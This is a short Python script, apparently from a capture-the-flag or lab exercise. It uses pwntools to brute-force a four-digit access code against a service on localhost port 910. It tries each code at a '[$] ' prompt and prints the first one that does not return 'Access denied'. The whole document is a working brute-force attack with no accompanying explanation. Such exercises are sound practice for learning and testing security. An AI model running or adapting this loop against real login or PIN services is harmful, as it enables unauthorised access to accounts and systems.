from pwn import *
for i in range(0,9999):
    code = str(i).zfill(4)
    r = remote("localhost",910)
    r.recvuntil("[$] ")
    r.sendline(code)
    response = r.recvline()
    r.close()
    if b"Access denied" not in response:
        print(code)
        break
